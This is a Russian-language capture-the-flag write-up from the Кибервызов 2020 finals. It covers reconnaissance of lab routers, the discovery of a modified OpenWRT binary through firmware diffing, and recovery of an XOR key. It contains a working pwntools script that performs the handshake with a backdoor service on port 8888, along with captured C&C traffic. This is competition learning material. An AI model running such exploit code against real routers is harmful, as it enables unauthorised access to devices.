# Кибервызов 2020
Решение для финала Кибервызов 2020
От команды `картинг по ру` - @kinjalik @djalilkhisaliev @gavt45 @gleb270

# Первичное исследование сетевой инфраструктуры

Подключились по SSH по выданным данным для входа. 
Запустили анализ с помощью `nmap` и `arp` и нашли 3 ip с интересными портами и проанализировав дампы трафика, определили, что роутеры находятся по адресам: 10.0.8.12 , 10.0.8.13 , 10.0.8.14 , а атакующий находится по адресу 192.168.1.2

# Обратная разработка сетевых протоколов

Чтобы найти уязвимые файлы, мы скачали оригинальный образ прошивок OpenWRT и с помощью `diff` нашли отличающиеся файлы

## 1. MIPS

Файл находился по пути `/usr/bin/sign`
 
Так же 10.0.8.13 биндится на 8888, тем самым создается подключение
192.168.1.2 сюда создается коннект c 10.0.8.13 на порт 5555
Найден ключ xor: 

03 22 a7 14 be c4 10 2d f1 37 c7 1e 68 49 23 67 #original

67 23 49 68 1e c7 37 f1 2d 10 c4 be 14 a7 22 03

3323001a 7e2a
3323001a 06173b34

29152c15 7e2a
29152c15 32 19 31 29

### Код для эксплойта:
```
def xor(s1,s2):
        return ''.join(chr(ord(a) ^ ord(b)) for a,b in zip(s1,s2))

from pwn import *

r = remote('10.0.8.13', 8888)

k = unhexlify('03 22 a7 14 be c4 10 2d f1 37 c7 1e 68 49 23 67'.replace(' ',''))

IV = b'\x33\x23\x00\x1a'
print(IV)
init_msg = IV+b'\x7e\x2a'+IV+b'\x01\x01\x01\x01'
our_part = IV+b'\x01\x01\x01\x01'
print(init_msg)
enc_init_msg = xor(init_msg, k)
info(init_msg)
info(enc_init_msg)

r.send(enc_init_msg)

their_part = xor(r.recv(), k)

sess_key = our_part+their_part

info("Enc out: "+str(xor('\xde\xad',sess_key)[:2]))

r.send(xor('\x55\xfa',sess_key)[:2])

print(xor(r.recv(), sess_key))

```



Перехваченнный зашифрованный траффик на C&C сервер. Расшифровывается ксором .
2006391a293d1101072b3b1d2f0031172e38012520043a0d21130a3c1c221b311d3934251c15043e3012323f1b150603343105003e100e092a29302e0a263e1e203b1d26261a323a32022018291523080529291f0921193c3b0006161b072c3e241a32281b213f27210d03222d0034102d242a0f2d0330360300330f263d07200a1504323a3d0c2619082a3f0829083b392d0b0c060920191904380529162204282a39032f1d03362b3a34172415371b313a171a0f3a1203261c2c1016022e133e081b0e313e10131c050c1e3f20313c3c0a03182332091d1e0315003521040836 

should_be_not_return_1 сравнивает dect_buffer с CE FA
Первые два байта дешифрованного сообщения должны быть CE и FA. 

ОПИСАНИЕ:

Открыли файл  sign 
![](https://i.imgur.com/EHWi1C2.png) #main
![](https://i.imgur.com/FkXFzRr.png) #should_not_return_1
![](https://i.imgur.com/yMpvIbA.png) #parse_command
